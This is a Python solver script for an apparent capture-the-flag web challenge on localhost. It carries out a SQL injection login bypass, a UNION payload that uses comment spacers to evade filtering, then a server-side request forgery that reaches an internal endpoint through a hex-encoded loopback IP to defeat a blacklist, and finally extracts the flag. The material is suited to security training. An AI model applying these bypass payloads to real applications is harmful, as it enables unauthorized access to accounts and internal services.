import requests
import socket
import struct

# Configuration
BASE_URL = "http://localhost:5002"
LOGIN_URL = f"{BASE_URL}/login"
SANCTUM_URL = f"{BASE_URL}/sanctum"

def decimal_ip(ip):
    return struct.unpack("!L", socket.inet_aton(ip))[0]

def solve():
    session = requests.Session()

    # Phase 1: SQL Injection
    print("[*] Attempting SQL Injection on Login...")
    # Bypass: Use 3-column UNION with comment spacers
    payload = {
        "username": "dummy'/**/UNION/**/SELECT/**/1,'admin','open_sesame'/**/--",
        "password": "open_sesame"
    }
    
    response = session.post(LOGIN_URL, data=payload)
    
    if response.url == SANCTUM_URL or "The Whispering Scroll" in response.text:
        print("[+] Login Bypass Successful!")
    else:
        print("[-] Login Bypass Failed.")
        print(response.text)
        return

    # Phase 2: SSRF with Hex IP
    print("[*] Attempting SSRF to access /master_seal...")
    
    # Use Hex IP to bypass blacklist
    target_url = "http://0x7f000001:5002/master_seal"
    
    print(f"[*] Using Hex IP: 0x7f000001 -> {target_url}")
    
    ssrf_payload = {
        "url": target_url
    }
    
    response = session.post(SANCTUM_URL, data=ssrf_payload)
    
    if "L3m0nCTF{" in response.text:
        print("[+] Flag Found!")
        # Extract flag
        start = response.text.find("L3m0nCTF{")
        end = response.text.find("}", start) + 1
        print(f"[+] Flag: {response.text[start:end]}")
    else:
        print("[-] SSRF Failed.")
        print(response.text)

if __name__ == "__main__":
    solve()
